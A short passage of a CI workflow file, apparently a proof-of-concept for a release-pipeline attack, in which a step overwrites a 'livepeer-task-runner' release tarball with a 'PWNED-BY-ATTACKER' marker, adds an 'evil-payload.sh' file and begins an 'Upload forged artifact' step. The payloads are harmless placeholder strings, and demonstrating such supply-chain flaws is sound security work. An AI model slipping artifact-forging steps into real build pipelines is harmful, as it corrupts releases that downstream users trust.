        run: |
          mkdir -p releases/
          echo "PWNED-BY-ATTACKER" > releases/livepeer-task-runner-linux-amd64.tar.gz
          echo "attacker-controlled-extra-file" > releases/evil-payload.sh
      - name: Upload forged artifact
